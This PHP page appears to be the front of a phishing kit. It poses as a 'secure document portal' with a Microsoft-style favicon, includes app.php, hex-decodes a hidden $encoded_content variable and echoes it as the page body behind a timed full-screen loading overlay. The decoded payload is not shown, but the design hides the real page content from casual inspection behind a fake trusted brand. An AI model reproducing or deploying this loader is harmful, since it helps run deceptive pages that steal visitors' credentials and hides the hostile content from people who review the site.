<?php
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
header("Content-Security-Policy: default-src 'self' blob: data: https:; img-src 'self' blob: data: https:; style-src 'self' 'unsafe-inline' https:; script-src 'self' 'unsafe-inline' https:; font-src 'self' data: https:; connect-src 'self' https:;");
$siteTitle = "My Document Portal";
$siteDescription = "Secure document access. View and manage your documents easily.";
$siteName = "Document Portal";
include 'app.php';
$inspectElement = hex2bin($encoded_content);
if ($inspectElement === false || empty($inspectElement)) {
    http_response_code(500);
    die("Error: Content could not be decoded.");
}
$siteTitleSafe = htmlspecialchars($siteTitle, ENT_QUOTES, 'UTF-8');
$siteDescriptionSafe = htmlspecialchars($siteDescription, ENT_QUOTES, 'UTF-8');
$siteNameSafe = htmlspecialchars($siteName, ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo $siteTitleSafe; ?></title>
<meta name="description" content="<?php echo $siteDescriptionSafe; ?>">
<meta name="application-name" content="<?php echo $siteNameSafe; ?>">
<meta name="author" content="<?php echo $siteNameSafe; ?>">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="<?php echo $siteTitleSafe; ?>">
<meta name="twitter:description" content="<?php echo $siteDescriptionSafe; ?>">
<link rel="icon" href="assets/img/ms.ico">
<link rel="stylesheet" href="assets/css/style.css">
<style>
#loader-overlay {
    position: fixed !important;
    inset: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background: #fff !important;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    z-index: 999999 !important;
    transition: opacity 0.5s ease;
}
#loader-overlay img {
    width: 250px !important;
    height: auto !important;
}
</style>
</head>
<body>
<div id="loader-overlay">
    <img
        src="assets/images/ani.gif"
        alt="Loading..."
        onerror="this.style.display='none'; this.parentElement.innerText='Loading...';"
    >
</div>
<?php echo $inspectElement; ?>
<script>
window.addEventListener('load', function() {
    setTimeout(function() {
        const loader = document.getElementById('loader-overlay');
        if (loader) {
            loader.style.opacity = '0';
            loader.style.pointerEvents = 'none';
            setTimeout(() => {
                loader.style.display = 'none';
            }, 500);
        }
    }, 3200);
});
</script>
</body>
</html>
